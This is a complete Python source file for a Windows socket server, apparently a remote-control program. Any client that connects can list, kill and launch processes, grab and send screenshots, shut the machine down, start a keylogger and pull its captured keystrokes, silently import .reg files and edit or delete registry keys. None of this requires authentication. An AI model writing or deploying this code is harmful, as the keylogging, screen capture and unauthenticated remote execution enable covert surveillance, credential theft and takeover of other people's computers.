import socket
import subprocess
import os
import json
from winreg import *
from pynput import keyboard
from pynput.keyboard import Listener, Key
from PIL import Image
from PIL import ImageGrab
HOST=''
PORT= 8080

def List_Process():
    jsend={ "process":[]}
    output = os.popen('wmic process get description, processid, threadcount').read()
    for line in output.splitlines():
        tmp=str(line)
        tmp=tmp.strip()
        if tmp.endswith("ThreadCount"):
            continue
        if (tmp!=""):
            tmp_name=tmp.partition("  ")[0]
            tmp_TC=tmp.rpartition("  ")[2]
            tmp_PID=((tmp.partition("  ")[2]).lstrip()).partition("  ")[0]
            tmp_process={}
            tmp_process["name"]=tmp_name
            tmp_process["PID"]=tmp_PID
            tmp_process["TC"]=tmp_TC
            jsend["process"].append(tmp_process)
    jsended=json.dumps(jsend)
    return jsended
def Check_Process(a):
    output = os.popen('wmic process get description, processid').read()
    for line in output.splitlines():
        tmp=str(line)
        tmp=tmp.strip()
        if (tmp!=""):
            tmp_PID=tmp.rpartition("  ")[2]
            if (str(tmp_PID)==str(a)):
                return True
    return False

def List_App():
    jsend={ "app":[]}
    tmp_bfTC=[]
    cmd = 'powershell "Get-Process | where {$_.MainWindowTitle } | select ProcessName,Id"'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    for line in proc.stdout:
        if line.rstrip():
            tmp=line.decode().rstrip()
            if tmp.endswith("Id") or tmp.endswith("-"):
                continue
            tmp_name=tmp.partition(" ")[0]
            tmp_ID=tmp.rpartition(" ")[2]
            tmp_app={}
            tmp_app["name"]=tmp_name
            tmp_app["ID"]=tmp_ID
            tmp_bfTC.append(tmp_app)
            #jsend["app"].append(tmp_app)
    for tmp_app in tmp_bfTC:
        cmd = 'powershell "(Get-Process -ID '+tmp_app['ID']+'|  Select-Object -ExpandProperty  Threads | Select-Object ID).Count"'
        #print(cmd)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        for line in proc.stdout:
            tmp_app["TC"]=line.decode().rstrip()
        jsend["app"].append(tmp_app)
    jsended=json.dumps(jsend)
    return jsended
def Check_App(a):
    cmd = 'powershell "Get-Process | where {$_.MainWindowTitle } | select ProcessName,Id"'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    for line in proc.stdout:
        if line.rstrip():
            tmp=line.decode().rstrip()
            tmp_ID=tmp.rpartition(" ")[2]
            if (str(tmp_ID)==str(a)):
                return True
    return False

keylog=""
unhook=True
def on_press(key):
    global keylog
    global unhook
    if unhook==True:
        return False
    if hasattr(key, 'char'):  
        keylog+=str(key.char)
    elif key == Key.space:  
        keylog+=' '
    elif key == Key.enter:  
        keylog+='\n'
    elif key == Key.tab:  
        keylog+='\t'
    else:  
        keylog+=('[' + key.name + ']')
hostname=socket.gethostname()
local_ip = socket.gethostbyname(hostname)
HOST=str(local_ip)
def main():
    global keylog
    global unhook
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST,PORT))
        s.listen()
        while True:
            print("server ",HOST,":",str(PORT)," wait")
            conn, addr = s.accept()
            with conn:
                print('Connected by',addr)
                while True:
                    print("listening")
                    data=conn.recv(1024)
                    if not data:
                        break
                    data=data.decode()
                    print(data)
                    x=data.split('//')
                    if x[0]=="quit":
                        break
                    if x[0]=="ping":
                        pass
                    if x[0]=="process":
                        if x[1]=="kill":
                            if Check_Process(x[2]):
                                os.kill(int(x[2]), 9)
                                conn.sendall(b'ok')
                            else:
                                conn.sendall(b'404')
                        if x[1]=="list":
                            conn.sendall(List_Process().encode())
                        if x[1]=="start":
                            DETACHED_PROCESS = 0x00000008
                            try:
                                results = subprocess.Popen([x[2]],close_fds=True, creationflags=DETACHED_PROCESS)
                                conn.sendall(b'ok')
                            except:
                                conn.sendall(b'404')
                    if x[0]=="app":
                        if x[1]=="kill":
                            if Check_App(x[2]):
                                os.kill(int(x[2]), 9)
                                conn.sendall(b'ok')
                            else:
                                conn.sendall(b'404')
                        if x[1]=="list":
                            conn.sendall(List_App().encode())
                        if x[1]=="start":
                            DETACHED_PROCESS = 0x00000008
                            try:
                                results = subprocess.Popen([x[2]],close_fds=True, creationflags=DETACHED_PROCESS)
                                conn.sendall(b'ok')
                            except:
                                conn.sendall(b'404')
                    if x[0]=="capture":
                        """
                        a = pyautogui.screenshot()
                        tosend=a.tobytes()
                        size=len(tosend)
                        print(size)
                        
                        conn.sendall(str(size).encode())
                        conn.sendall(tosend)
                        """
                        img = ImageGrab.grab(bbox=None)
                        img.save("screenshot.png")
                        f=open("screenshot.png",'rb')
                        l=f.read(4096)
                        while(l):
                            conn.send(l)
                            l=f.read(4096)
                        f.close()
                        conn.sendall(b'ok')
                    if x[0]=="shutdown":
                        try:
                            os.system("shutdown /s /t 1")
                            conn.sendall(b'ok')
                        except:
                            conn.sendall(b'404')
                    if x[0]=="key":
                        if x[1]=="unhook":
                            conn.sendall(b"ok")
                            unhook=True
                        if x[1]=="getkey":
                            if keylog=="":
                                keylog="404"
                            conn.sendall(keylog.encode())
                            keylog=""
                        if x[1]=="hook":
                            if unhook==True:
                                unhook=False
                                conn.sendall(b'ok')
                                listener = keyboard.Listener(on_press=on_press)
                                listener.start()
                    if x[0]=="re":
                        def toKey(s):
                            hkey="404"
                            if s=="HKEY_CURRENT_USER":
                                hkey=HKEY_CURRENT_USER
                            if s=="HKEY_CLASSES_ROOT":
                                hkey=HKEY_CLASSES_ROOT
                            if s=="HKEY_LOCAL_MACHINE":
                                hkey=HKEY_LOCAL_MACHINE
                            if s=="HKEY_USERS":
                                hkey=HKEY_USERS
                            if s=="HKEY_CURRENT_CONFIG":
                                hkey=HKEY_CURRENT_CONFIG
                            return hkey
                        def toTypeID(s):
                            ID=0
                            if s=="String": #str
                                ID=1
                            if s=="Binary": #bytes(a,'ascii')
                                ID=3
                            if s=="DWORD":  #int
                                ID=4
                            if s=="QWORD":  #int
                                ID=11
                            if s=="Multi-String": #arr of str
                                ID=7
                            if s=="Expandable String": #str
                                ID=2
                            return ID
                        def toPath(s):
                            s=s.replace("/","\\")
                            return s
                        
                        if x[1]!="send":
                            f=open("keys.reg","w")
                            f.write(x[2])
                            f.close()
                            try:
                                os.system("regedit /s "+os.path.abspath(os.getcwd())+"\\keys.reg")
                                conn.sendall(b'ok')
                            except:
                                conn.sendall(b'404')
                        else:
                            if x[2]=="get_value": #get_value//PATH//name
                                path=x[3].partition('/') 
                                hkey=toKey(path[0])
                                if hkey=="404":
                                    conn.sendall(hkey.encode())
                                    continue
                                try:
                                    key = OpenKey(hkey, toPath(path[2]), 0, KEY_ALL_ACCESS)
                                    data,valType=QueryValueEx(key, x[4])
                                    if valType==3:
                                        conn.sendall(data)
                                    else:
                                        conn.sendall(str(data).encode())
                                    CloseKey(key)
                                except:
                                    conn.sendall(b"404")
                            if x[2]=="set_value": #set_value(2)//PATH//name//value//type
                                path=x[3].partition('/')
                                hkey=toKey(path[0])
                                if hkey=="404":
                                    conn.sendall(hkey.encode())
                                    continue
                                ID=toTypeID(x[6])
                                try:
                                    key = OpenKey(hkey, toPath(path[2]), 0, KEY_ALL_ACCESS)
                                    data=x[5]
                                    if ID==3:
                                        data=bytes(x[5],'ascii')
                                    if ID==7:
                                        data=x[5].split("\\n")
                                    if ID==4 or ID==11:
                                        data=int(x[5])
                                    SetValueEx(key,x[4],0,ID,data)
                                    CloseKey(key)
                                    conn.sendall(b"ok")
                                except:
                                    conn.sendall(b"404")  
                            if x[2]=="delete_value": #delete_value//PATH//value name
                                path=x[3].partition('/')
                                hkey=toKey(path[0])
                                if hkey=="404":
                                    conn.sendall(hkey.encode())
                                    continue
                                try:
                                    key = OpenKey(hkey, toPath(path[2]), 0, KEY_ALL_ACCESS)
                                    DeleteValue(key,x[4])
                                    CloseKey(key)
                                    conn.sendall(b"ok")
                                except:
                                    conn.sendall(b"404")
                            if x[2]=="create_key":  #create_key//PATH
                                path=x[3].partition('/')
                                hkey=toKey(path[0])
                                if hkey=="404":
                                    conn.sendall(hkey.encode())
                                    continue
                                try:
                                    CreateKey(hkey, toPath(path[2]))
                                    conn.sendall(b"ok")
                                except:
                                    conn.sendall(b"404")
                            if x[2]=="delete_key":  #delete_key//PATH
                                path=x[3].partition('/')
                                hkey=toKey(path[0])
                                if hkey=="404":
                                    conn.sendall(hkey.encode())
                                    continue
                                try:
                                    DeleteKey(hkey, toPath(path[2]))
                                    conn.sendall(b"ok")
                                except:
                                    conn.sendall(b"404")
